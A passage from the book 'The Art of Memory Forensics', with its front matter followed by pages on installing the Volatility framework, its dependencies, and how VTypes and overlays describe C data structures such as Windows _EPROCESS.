www.it-ebooks.info

www.it-ebooks.info

Praise for
The Art of

MeMory Forensics
“The best, most complete technical book I have
—Jack crook, Incident Handler
read in years”
“The authoritative guide to memory forensics”
—Bruce Dang, Microsoft

“An in-depth guide to memory forensics from
the pioneers of the field”
—Brian carrier, Basis Technology

www.it-ebooks.info

www.it-ebooks.info

The Art of
Memory
Forensics
Detecting Malware and
Threats in Windows, Linux,
and Mac Memory
Michael Hale Ligh
Andrew Case
Jamie Levy
AAron Walters

www.it-ebooks.info

The Art of Memory Forensics: Detecting Malware and Threats in Windows, Linux, and Mac Memory
Published by John Wiley & Sons, Inc.
10475 Crosspoint Boulevard
Indianapolis, IN 46256
www.wiley.com
Copyright © 2014 by John Wiley & Sons, Inc., Indianapolis, Indiana
Published simultaneously in Canada
ISBN: 978-1-118-82509-9
ISBN: 978-1-118-82504-4 (ebk)
ISBN: 978-1-118-82499-3 (ebk)
Manufactured in the United States of America
10 9 8 7 6 5 4 3 2 1
No part of this publication may be reproduced, stored in a retrieval system or transmitted in any form
or by any means, electronic, mechanical, photocopying, recording, scanning or otherwise, except as
permitted under Sections 107 or 108 of the 1976 United States Copyright Act, without either the prior written permission of the Publisher, or authorization through payment of the appropriate per-copy fee to the

directory, so it also does not require admin privileges. If you use this method, you
can easily have multiple versions of Volatility available at the same time by just
keeping them in separate directories. To uninstall, just delete the directory.

Development Branch (Code Repository)
Volatility is currently hosted on Github. This is where you can find the most recent bleeding-edge code, including any patches to fix bugs that were identified after a release and
also any major new features that are being tested before they reach the mainstream. Thus,
this code is for people who are less interested in a stable release and more interested in
what’s coming next.
By default, the source control utilities are built into recent Mac operating systems and
they are available through the package managers of most Linux distributions. For example,
you can type apt-get install git on Debian/Ubuntu or yum install git-core on Centos/
Red Hat. For Windows, you can download mysysGit (http://msysgit.github.io) or use
the GitHub application (https://windows.github.com). Once you have the tools installed,
you can check out the Volatility source code. Here’s an example of cloning the repository
on Linux or Mac:
$ git clone https://github.com/volatilityfoundation/volatility.git
Cloning into 'volatility'...
remote: Counting objects: 10202, done.
remote: Compressing objects: 100% (2402/2402), done.
remote: Total 10202 (delta 7756), reused 10182 (delta 7736)
Receiving objects: 100% (10202/10202), 12.11 MiB | 343.00 KiB/s, done.
Resolving deltas: 100% (7756/7756), done.
Checking connectivity... done.
$ python volatility/vol.py --help
Volatility Foundation Volatility Framework 2.4
Usage: Volatility - A memory forensics analysis platform.
Options:
-h, --help
list all available options and their default values.
Default values may be set in the configuration file
(/etc/volatilityrc)
[snip]

After developers commit patches or changes to the source code, you can sync by simply
typing git pull, as opposed to waiting for a new release. In this case, you transfer only
files that were changed since your last update.

www.it-ebooks.info

49

50 Part I: An Introduction to Memory Forensics
NOTE
If a problem or particular behavior persists after an update, it may be due to “stale”
.pyc (compiled python files). To clean up the .pyc files, change into the Volatility root
directory and, if you’re on Linux or Mac, type the following:
$ make clean

If you’re on Windows, enter a PowerShell prompt and type the following:
PS C:\volatility> Get-ChildItem -path . -Include '*.pyc' -Recurse | Remove-Item

Dependencies
As previously mentioned, if you’re working with the standalone Windows executable,
you do not need to worry about dependencies. In all other cases, you may need to install
extra packages depending on the Volatility plugins that you intend to run. A majority of
core functionality will work without any additional dependencies (aside from the standard Python interpreter). The listing that follows identifies the third-party modules that
Volatility can leverage and the specific plugins that utilize them.

•
•
•
•
•

Distorm3: A powerful disassembler library for x86/AMD64 (http://code.google
.com/p/distorm ). Volatility plugins apihooks , callbacks , impscan , volshell,
linux_volshell, mac_volshell, and linux_check_syscall depend on this library.
Yara: A malware identification and classification tool (http://code.google.com/p/
yara-project). Volatility plugins yarascan, mac_yarascan, and linux_yarascan
depend on this library.
PyCrypto: The Python Cryptography Toolkit (https://www.dlitz.net/software/
pycrypto). Volatility plugins lsadump and hashdump depend on this library.
PIL: The Python Imaging Library (http://www.pythonware.com/products/pil). The
screenshot plugin depends on this library.
OpenPyxl: A Python library to read and write Excel files (https://bitbucket.org/
ericgazoni/openpyxl/wiki/Home). The timeliner plugin, when used in the xlsx
output mode, depends on this plugin.

For details on how to install the dependencies, you should read the documentation
provided by the project maintainers. In most cases, you will just be running python
setup.py install or using a package manager. If the dependencies ever change, you
can always find a current list on the Volatility wiki.

www.it-ebooks.info

The Volatility Framework

The Framework
The Volatility Framework consists of several subsystems that work together to provide
a robust set of features. Over the next few pages, we will introduce the key components
in a concise but thorough manner. Although some of the components are geared toward
developers rather than users of the framework, the terms and concepts that you learn
here will be extremely valuable to understanding how memory forensics tools operate,
and they will be mentioned throughout the rest of the book.

VTypes
This is Volatility’s structure definition and parsing language. If you recall from Chapter 2,
most operating systems and applications that run on those operating systems are written
in C, with abundant use of data structures to organize related variables and attributes.
Because Volatility is written in Python, you need a way to represent C data structures
in Python source files. VTypes enable you to do exactly that. You can define structures
whose member names, offsets, and types all match the ones used by the operating system
you’re analyzing, so that when you find an instance of the structure in a memory dump,
Volatility knows how to treat the underlying data (i.e., as an integer, string, or pointer).
For the upcoming example, assume that you are dealing with C data structure like this:
struct process {
int pid;
int parent_pid;
char name[10];
char * command_line;
void * ptv;
};

The structure has five members: two integers, a character array, a pointer to a string,
and a void pointer (more about this in the upcoming “Overlays” section). The equivalent
structure in the VType language is as follows:
'process' : [ 26, {
'pid' : [ 0, ['int']],
'parent_pid' : [ 4, ['int']],
'name' : [ 8, ['array', 10, ['char']]],
'command_line' : [ 18, ['pointer', ['char']]],
'ptv' : [ 22, ['pointer', ['void']]],
}]

At first glance, the syntax may appear slightly complex, but it is just a series of Python
dictionaries and lists. The name of the structure, process, is the first dictionary key, and
it is followed by the total size of the structure, 26. You then have each member, along with

www.it-ebooks.info

51

52 Part I: An Introduction to Memory Forensics
their corresponding offsets from the base of the structure and their types. For example,
name is at offset 8 and it is an array of 10 characters. As you get familiar with the syntax
and begin modeling more elaborate structures, you will notice the VType language supports just as many data types as C provides. For example, you can define pointers, bit
fields, enumerations, and unions, to name a few.
The following example shows an _EPROCESS structure from a Windows 7 x64 system. The
total size in bytes of the structure is 0x4d0, and it begins with a member named Pcb, which
is actually another structure of type _KPROCESS. Notice that there are three different members at offset 0x1f8: ExceptionPortData, ExceptionPortValue, and ExceptionPortState.
This is an example of how a union appears in the VType language. As you may know,
the size of a union is dictated by the largest element that it contains, which is 8 bytes in
this case (an unsigned long long). Although ExceptionPortState is within this union,
it is defined as a BitField that consists of the least significant three bits (starts at 0 and
ends at 3) of the 8-byte value.
'_EPROCESS' : [ 0x4d0, {
'Pcb' : [ 0x0, ['_KPROCESS']],
'ProcessLock' : [ 0x160, ['_EX_PUSH_LOCK']],
'CreateTime' : [ 0x168, ['_LARGE_INTEGER']],
'ExitTime' : [ 0x170, ['_LARGE_INTEGER']],
'RundownProtect' : [ 0x178, ['_EX_RUNDOWN_REF']],
'UniqueProcessId' : [ 0x180, ['pointer64', ['void']]],
'ActiveProcessLinks' : [ 0x188, ['_LIST_ENTRY']],
'ProcessQuotaUsage' : [ 0x198, ['array', 2, ['unsigned long long']]],
'ProcessQuotaPeak' : [ 0x1a8, ['array', 2, ['unsigned long long']]],
'CommitCharge' : [ 0x1b8, ['unsigned long long']],
'QuotaBlock' : [ 0x1c0, ['pointer64', ['_EPROCESS_QUOTA_BLOCK']]],
'CpuQuotaBlock' : [ 0x1c8, ['pointer64', ['_PS_CPU_QUOTA_BLOCK']]],
'PeakVirtualSize' : [ 0x1d0, ['unsigned long long']],
'VirtualSize' : [ 0x1d8, ['unsigned long long']],
'SessionProcessLinks' : [ 0x1e0, ['_LIST_ENTRY']],
'DebugPort' : [ 0x1f0, ['pointer64', ['void']]],
'ExceptionPortData' : [ 0x1f8, ['pointer64', ['void']]],
'ExceptionPortValue' : [ 0x1f8, ['unsigned long long']],
'ExceptionPortState' : [ 0x1f8, ['BitField', dict(start_bit = 0, end_bit = 3,
native_type='unsigned long long')]],
'ObjectTable' : [ 0x200, ['pointer64', ['_HANDLE_TABLE']]],
[snip]

Generating VTypes
Despite the fact that working with VType syntax can be a fairly simple task once you practice, the sheer number of structures that an operating system or application uses makes it
highly impractical to generate them all by hand. Furthermore, the structures can change

www.it-ebooks.info

The Volatility Framework
drastically with each new version of an operating system, or even with just a new service
pack or security update. To deal with these complexities, Brendan Dolan-Gavitt (http://www
.cc.gatech.edu/grads/b/brendan/ ) designed a method of automatically generating
VTypes from Microsoft’s debugging symbols (PDB files). In particular, he wrote a library
named pdbparse (https://code.google.com/p/pdbparse) that can convert the proprietary,
binary PDB file format into the open VType language that Volatility can understand.
Generally, you can find the core data structures that Volatility needs to support a Microsoft
Windows release in the debugging symbols of the NT kernel module (ntoskrnl.exe,
ntkrnlpa.exe, and so on). However, it is important to note that Microsoft does not divulge
all the structures that its operating system needs—only the ones that could reasonably be
seen to assist with debugging efforts. This excludes thousands of the structures involved
in password management, security mechanisms, and other features of the system that are
better left undocumented for fear that attackers would use the information in nefarious
ways (i.e., to design exploits). In these cases, the generation of VTypes falls back into the
manual realm: Developers or researchers must reverse engineer components of the operating system and create their own structure definitions that can be used with Volatility.

Overlays
Overlays enable you to fix up, or patch, the automatically generated structure definitions.
This is an important aspect of memory forensics because operating system code often
makes heavy use of void pointers (void *) in their structures. A void pointer is a pointer
to data whose type is unknown or arbitrary at the time of the allocation. Unfortunately,
debugging symbols don’t contain enough information to derive the types automatically,
and you may need to follow, or dereference, these pointers during an analysis. Assuming
that you determined the type for a given structure member (usually through reverse
engineering or trial and error), you can apply an overlay, which will override the automated VType definition.
In the previous section, you had a structure named process with a void * ptv member. If you know that ptv is actually a pointer to another process structure, you could
construct an overlay that looks like this:
'process' : [ None, {
'ptv' : [ None, ['pointer', ['process']]],
}

Notice the two values of None, which are in the positions normally used to store the
size of the structure and member offsets. The value of None indicates that no change is
to be made to those parts of the definition. The only thing that this overlay is changing
is the type of ptv from void * to process *. After applying such an overlay, when you

www.it-ebooks.info

53

54 Part I: An Introduction to Memory Forensics
access ptv in your Volatility plugins, the framework will know that you’re referencing a
process structure.
Aside from providing the ability to make structure definitions more accurate, overlays
also come in handy for convenience and consistency purposes. For example, Windows
stores many of its timestamps in a structure called _LARGE_INTEGER. The structure contains two 32-bit integers (a low part and high part), which are combined to form a 64-bit
timestamp value. The value of 1325230153, when translated, means 2011-12-30 07:29:13
UTC+0000. Many Volatility plugins need to report timestamps in this human-readable
format. Thus, it makes sense to globally change structures that use _LARGE_INTEGER to
